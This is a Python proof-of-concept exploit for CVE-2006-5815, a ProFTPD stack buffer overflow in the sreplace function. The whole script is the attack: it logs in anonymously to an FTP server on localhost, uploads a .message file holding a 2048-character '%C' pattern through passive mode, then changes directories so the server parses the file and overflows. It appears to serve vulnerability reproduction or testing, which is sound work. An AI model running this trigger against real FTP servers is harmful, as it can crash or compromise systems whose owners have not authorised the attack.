#!/usr/bin/env python3
"""
PoC: CVE-2006-5815 - ProFTPD sreplace Stack Buffer Overflow
Trigger: Upload .message file with format string, then CWD to directory triggers sreplace overflow
"""

import socket

s = socket.socket()
s.connect(("localhost", 2122))
s.recv(1024)  # banner

# Login anonymously
s.send(b"USER anonymous\r\n")
s.recv(1024)
s.send(b"PASS test@test.com\r\n")
s.recv(1024)

# Change to upload directory
s.send(b"CWD upload\r\n")
s.recv(1024)

# Upload malicious .message file with overflow payload
# sreplace function overflows on %C expansion with long patterns
payload = b"%" + b"C" * 2048 + b"\r\n"
s.send(b"TYPE A\r\n")
s.recv(1024)

# Use PASV mode for upload
s.send(b"PASV\r\n")
resp = s.recv(1024).decode()
# Parse PASV response for port
nums = resp.split("(")[1].split(")")[0].split(",")
port = int(nums[4]) * 256 + int(nums[5])

# Upload .message file
s.send(b"STOR .message\r\n")
s.recv(1024)

# Connect to data port and send payload
d = socket.socket()
d.connect(("localhost", port))
d.send(payload)
d.close()
s.recv(1024)

# Now CWD to parent dir and back to trigger .message display (sreplace call)
s.send(b"CWD /var/ftp\r\n")
s.recv(1024)
s.send(b"CWD upload\r\n")  # This triggers the overflow when parsing .message
s.recv(1024)
s.close()
